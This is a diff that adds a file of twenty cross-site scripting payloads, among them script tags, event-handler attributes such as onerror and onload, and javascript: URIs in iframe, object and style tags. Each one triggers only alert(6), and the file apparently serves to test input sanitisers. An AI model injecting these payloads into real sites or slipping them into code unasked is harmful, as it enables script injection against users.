@@ -1,0 +1,20 @@
+<script>alert(6)</script>
+<img src=x onerror=alert(6)>
+<svg onload=alert(6)>
+<body onload=alert(6)>
+<iframe src="javascript:alert(6)">
+<a href="javascript:alert(6)">click</a>
+<input onfocus=alert(6) autofocus>
+<details open ontoggle=alert(6)>
+<marquee onstart=alert(6)>
+"><script>alert(6)</script>
+' onmouseover=alert(6) '
+<x onclick="alert(6)">click</x>
+<div style="background:url('javascript:alert(6)')">
+<object data="javascript:alert(6)">
+<embed src="data:text/html,<script>alert(6)</script>">
+<form action="javascript:alert(6)"><input type=submit>
+<isindex action="javascript:alert(6)" type=image>
+<xss style="background:url('javascript:alert(6)')">
+<math><brute href="javascript:alert(6)">click</brute></math>
+<video><source onerror="javascript:alert(6)">
